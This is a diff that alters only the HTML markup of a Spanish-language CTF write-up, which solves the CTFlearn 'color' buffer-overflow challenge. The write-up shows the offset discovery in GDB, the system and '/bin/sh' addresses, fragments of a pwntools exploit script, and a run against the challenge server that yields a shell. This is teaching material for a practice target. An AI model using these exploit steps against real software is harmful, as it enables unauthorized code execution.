@@ -78,14 +78,14 @@ Boo... I hate that color! :(
 <span class=code-cyan>$</span> <span class=code-dark-green>./color</span>
 Enter your favorite color: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
 zsh: segmentation fault (core dumped)  ./color
-</code></pre></div><p>Perfecto. Ahora podemos utilizar GDB para obtener el <em>offset</em> necesario para sobrescribir el registro <code>$eip</code> (que contiene la dirección de la siguiente instrucción a ejecutar):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q color
+</code></pre></div><p>Perfecto. Ahora podemos utilizar GDB para obtener el <em>offset</em> necesario para sobrescribir el registro <code>$eip</code> (que contiene la dirección de la siguiente instrucción a ejecutar):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>color</span>
 Reading symbols from <span class=code-dark-green>color</span>...
 (No debugging symbols found in <span class=code-dark-green>color</span>)
-<span class=code-red>gef➤</span>   pattern create 100
+<span class=code-red>gef➤</span>  pattern create 100
 <span class=code-blue>[+]</span> Generating a pattern of 100 bytes (n=4)
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
 <span class=code-green>[+]</span> Saved as '$_gef0'
-<span class=code-red>gef➤</span>   run
+<span class=code-red>gef➤</span>  run
 Starting program: ./color
 Enter your favorite color: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa  
 
@@ -95,22 +95,22 @@ Program received signal SIGSEGV, Segmentation fault.
 <span class=code-blue>[+]</span> Searching for '$eip'
 <span class=code-green>[+]</span> Found at offset 52 (little-endian search) <span class=code-red>likely</span>  
 <span class=code-green>[+]</span> Found at offset 49 (big-endian search)
-</code></pre></div><p>Vemos que necesitamos 52 bytes antes de <code>$eip</code>. Vamos a probarlo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>   pattern create 52
+</code></pre></div><p>Vemos que necesitamos 52 bytes antes de <code>$eip</code>. Vamos a probarlo:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-green>gef➤</span>  pattern create 52
 <span class=code-blue>[+]</span> Generating a pattern of 52 bytes (n=4)
 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaa
 <span class=code-green>[+]</span> Saved as '$_gef1'
-<span class=code-green>gef➤</span>   run
+<span class=code-green>gef➤</span>  run
 Starting program: ./color
 Enter your favorite color: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaaBBBB  
 
 Program received signal SIGSEGV, Segmentation fault.
 <span class=code-dark-blue>0x42424242</span> in <span class=code-dark-yellow>??</span> ()
-</code></pre></div><p>Genial, tenemos control sobre <code>$eip</code>. Ahora podemos buscar la dirección a la que queremos saltar, que es <code>system</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q color
+</code></pre></div><p>Genial, tenemos control sobre <code>$eip</code>. Ahora podemos buscar la dirección a la que queremos saltar, que es <code>system</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>gdb</span> -q <span class=mtku>color</span>
 Reading symbols from <span class=code-dark-green>color</span>...
 (No debugging symbols found in <span class=code-dark-green>color</span>)
 <span class=code-red>gef➤</span>  p system
 $1 = {&lt;text variable, no debug info&gt;} <span class=code-dark-blue>0x8048450</span> &lt;<span class=code-dark-yellow>system@plt</span>&gt;  
-</code></pre></div><p>No obstante, necesitamos llamar a <code>system("/bin/sh")</code>, por lo que tenemos que obtener un puntero a la cadena <code>"/bin/sh"</code>. Esto se puede realizar con <code>strings</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>strings</span> -atx color | <span class=code-dark-green>grep</span> /bin/sh  
+</code></pre></div><p>No obstante, necesitamos llamar a <code>system("/bin/sh")</code>, por lo que tenemos que obtener un puntero a la cadena <code>"/bin/sh"</code>. Esto se puede realizar con <code>strings</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>strings</span> -atx <span class=mtku>color</span> | <span class=code-dark-green>grep</span> /bin/sh  
     799 <span class=code-red>/bin/sh</span>
 </code></pre></div><p>Pero esta no es la dirección real de la cadena, solo es un <em>offset</em>. Para calcular la dirección real, tenemos que sumarle la dirección base del binario, que es <code>0x8048000</code>, ya que es un binario de 32 bits sin protección PIE (como muestra la salida de <code>checksec</code> arriba). Por tanto, la dirección de la cadena en tiempo de ejecución será <code>0x8048799</code>.</p><p>Finalmente, otro campo interesante de nuestro <em>payload</em> será la dirección de retorno. Esta no es tan importante en este reto, por lo que decidí rellenarla con bytes nulos, pero se podría utilizar la dirección del <code>main</code>, por ejemplo, para evitar causar una denegación de servicio (DoS).</p><p>Utilizando un <em>script</em> en Python con <code>pwntools</code>, podemos explotar el binario con este código:</p><div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=mtk3>#!/usr/bin/env</span> <span class=mtk3>python3</span>
 
@@ -131,7 +131,7 @@ $1 = {&lt;text variable, no debug info&gt;} <span class=code-dark-blue>0x8048450
 
 <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Enter</span> <span class=mtk4>your</span> <span class=mtk4>favorite</span> <span class=mtk4>color:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>  
 <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span>
-</code></pre></div><p>Si lo ejecutamos en local, obtenemos una consola de comandos:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py
+</code></pre></div><p>Si lo ejecutamos en local, obtenemos una consola de comandos:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span>
 [<span class=code-blue>*</span>] './color'
     Arch:     i386-32-little
     RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
@@ -172,7 +172,7 @@ color  solve.py
 
 <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>sendlineafter</span><span class=mtk1>(</span><span class="mtk7 mtki">b</span><span class=mtk4>'Enter</span> <span class=mtk4>your</span> <span class=mtk4>favorite</span> <span class=mtk4>color:</span> <span class=mtk4>'</span><span class=mtk1>,</span> <span class=mtk1>payload</span><span class=mtk1>)</span>  
 <span class=mtk1>p</span><span class=mtk1>.</span><span class=mtk8>interactive</span><span class=mtk1>()</span></span>
-</code></pre></div><p>Finalmente, podemos lanzarlo y conseguir la <em>flag</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> solve.py 104.131.79.111 1234
+</code></pre></div><p>Finalmente, podemos lanzarlo y conseguir la <em>flag</em>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>python3</span> <span class=mtku>solve.py</span> 104.131.79.111 1234
 [<span class=code-blue>*</span>] './color'
     Arch:     i386-32-little
     RELRO:    <span class=code-dark-yellow>Partial RELRO</span>
@@ -188,7 +188,7 @@ color.c
 flag.txt
 <span class=code-red>$</span> cat flag.txt
 CTFlearn{c0lor_0f_0verf1ow}
-</code></pre></div><p>Existe una manera más sencilla de realizar la explotación. Resulta que en el código hay una llamada explícita a <code>system("/bin/sh")</code>, y como tenemos una vulnerabilidad de <em>Buffer Overflow</em>, podemos redirigir el flujo de ejecución del programa a la dirección de esta instrucción.</p><p>En primer lugar, podemos extraer el código ensamblador con <code>objdump</code> (o con GDB), y luego buscar la llamada a <code>system</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>objdump</span> --disassemble=main color | <span class=code-dark-green>grep</span> -C 4 system
+</code></pre></div><p>Existe una manera más sencilla de realizar la explotación. Resulta que en el código hay una llamada explícita a <code>system("/bin/sh")</code>, y como tenemos una vulnerabilidad de <em>Buffer Overflow</em>, podemos redirigir el flujo de ejecución del programa a la dirección de esta instrucción.</p><p>En primer lugar, podemos extraer el código ensamblador con <code>objdump</code> (o con GDB), y luego buscar la llamada a <code>system</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>objdump</span> --disassemble=main <span class=mtku>color</span> | <span class=code-dark-green>grep</span> -C 4 system
  804866f:       e8 cc fd ff ff          call   8048440 &lt;puts@plt&gt;
  8048674:       83 c4 10                add    $0x10,%esp
  8048677:       83 ec 0c                sub    $0xc,%esp
